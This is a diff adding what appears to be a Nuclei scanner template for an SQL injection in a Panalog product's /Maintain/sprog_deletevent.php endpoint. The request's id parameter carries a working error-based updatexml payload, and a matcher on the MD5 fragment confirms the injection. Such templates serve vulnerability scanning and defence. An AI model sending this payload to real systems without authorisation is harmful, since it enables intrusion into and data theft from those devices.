@@ -1,0 +1,22 @@
+id: Panalog-id-sqli
+info:
+  name: Panalog-id-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/134908059
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(md5(1))),0)&cloudip=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca423'
